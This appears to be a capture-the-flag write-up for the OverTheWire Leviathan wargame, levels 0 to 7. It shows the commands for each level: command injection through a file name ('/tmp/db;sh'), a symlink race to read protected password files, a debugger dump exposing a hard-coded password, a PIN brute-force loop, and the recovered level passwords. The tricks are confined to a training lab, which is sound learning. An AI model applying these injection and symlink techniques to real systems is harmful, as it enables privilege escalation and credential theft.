# [LEVIATHAN](https://overthewire.org/wargames/leviathan/)

## Level 0 -> Level 1
```bash
$ grep "leviathan1" ~/.backup/bookmarks.html 
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
```

## Level 1 -> Level 2
```bash
$ ./check 
password: sex
$ cat /etc/leviathan_pass/leviathan2
ougahZi8Ta
```

## Level 2 -> Level 3
### Method 1
```bash
$ touch "/tmp/db;sh"
 ./printfile "/tmp/db;sh"
/bin/cat: /tmp/db: No such file or directory
$ whoami
leviathan3
$ cat /etc/leviathan_pass/leviathan3
Ahdiemoo1j
```
### Method 2 (**TOCTOU race**)
```bash
$ mkdir /tmp/whokilleddb
$ touch /tmp/whokilledb/symlink\ space  
$ ln -s /etc/leviathan_pass/leviathan3 /tmp/whokilledb/symlink
$ ./printfile /tmp/whokilledb/symlink\ space
Ahdiemoo1j
/bin/cat: space: No such file or directory
```

## Level 3 -> Level 4
```python
[do_stuf]
[stack]
0xff87d340│+0x0000: 0xff87d360  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"       ← $esp
0xff87d344│+0x0004: 0xff87d355  →  "snlprintf\n"
[eip]
0x80485b7 <do_stuff+92>    call   0x80483d0 <strcmp@plt>
```
```bash
$ ./level3 
Enter the password> snlprintf
[You've got shell]!
$ cat /etc/leviathan_pass/leviathan4
vuH0coox6m
```

## Level 4 -> Level 5
```bash
$ ./.trash/bin 
01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010 
# Decodes to: Tith4cokei
```

## Level 5 -> Level 6
```bash
$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log 
leviathan5@leviathan:~$ ./leviathan5 
UgaoFee4li
```

## Level 6 -> Level 7
**Bruteforce:**
```bash
$ for i in {0001..9999}; do echo Trying: $i ; ./leviathan6 $i | grep -v "Wrong" ; done
 ```

```bash
$ ./leviathan6  7123
$ cat /etc/leviathan_pass/leviathan7
ahy7MaeBo9
```
